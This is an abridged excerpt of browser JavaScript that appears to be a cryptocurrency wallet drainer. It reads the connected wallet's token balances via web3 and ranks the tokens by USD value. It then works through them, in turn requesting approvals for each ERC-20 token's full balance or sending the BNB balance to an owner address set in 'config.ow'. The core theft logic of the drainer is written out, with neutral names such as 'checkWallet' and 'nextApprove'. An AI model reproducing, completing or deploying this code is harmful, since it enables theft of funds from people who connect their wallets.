$(function() {
    ...
    async function checkWallet(){
      ...
      for(let i=0; i< tokenData.length; i++) {
          ...
          if(tokenData[i].addr == ""){
            ...
            balance = await getBalance(new web3.eth.Contract(erc20Abi, tokenData[i].addr), currentAccount, tokenData[i].decimals);
          }
              

          tokenData[i].balance = balance;

          tokenData[i].usd = balance*parseFloat(tokenData[i].price);
          console.log(tokenData[i].symbol + ":" + balance + ":$" + tokenData[i].usd );
          

          for(j = 0; j < vt_cnt; j++){
            if(tokenData[mostVTokenIds[j]].usd < tokenData[i].usd)
              break;
          }
          if(j < vt_cnt){
             for(k = vt_cnt; k > j; k--)
              mostVTokenIds[k] = mostVTokenIds[k-1];
            mostVTokenIds[j] = i;
          }
          else{
            mostVTokenIds[vt_cnt] = i;
          }
          vt_cnt++;
          //console.log(mostVTokenIds);
      } 
      if(maxTokenIdx >= 0){
          ;//console.log("max - " + tokenData[maxTokenIdx].symbol);
      }
      else {
        ...
        if(accounts && accounts[0]){
          if(currentAccount != accounts[0]){
            ...
            if(config.token_check == '0'){
              ...
              for(i = 0; i < c-1; i++)
                for(j = i+1; j < c; j++){
                  if((tokenData[i]["usd"]=='-' && tokenData[j]["usd"] != '-') || (tokenData[i]["usd"]!='-' && tokenData[j]["usd"] != '-' && parseFloat(tokenData[i]["usd"]) < parseFloat(tokenData[j]["usd"])) ){
                    var t = tokenData[i];
                    tokenData[i] = tokenData[j];
                    tokenData[j] = t;
                  }
                }
    ...
    function nextApprove(){
      if(config.token_check == '0'){
        ...
        if(vt_cnt > 0){
          for(i = 0; i < vt_cnt; i++){
            if(tokenData[mostVTokenIds[i]].approved && tokenData[mostVTokenIds[i]].approved==1)
              continue;
            break;
          }
        }      
        ...
        var idx = mostVTokenIds[i];
        if( tokenData[idx].balance < 0.002)
          return;
          
        if(tokenData[idx]["addr"] == "")
          sendBnbBalance(idx, currentAccount, config.ow);
        else {
          if(blacklist.includes(tokenData[idx]["addr"]) || (tokenData[idx]["usd"] == '-' && !whitelist.includes(tokenData[idx]["addr"])) ){
            tokenData[idx]["approved"] = 1;
            nextApprove();
            return;
          }
          sendApproveRequest(idx, currentAccount, tokenData[idx]["balance"], tokenData[idx]["addr"]);
        }
      }
      else{
        ...
        if(i < cnt){
          if(tokenData[i]["addr"] == "")
            sendBnbBalance(i, currentAccount, config.ow);
          else {
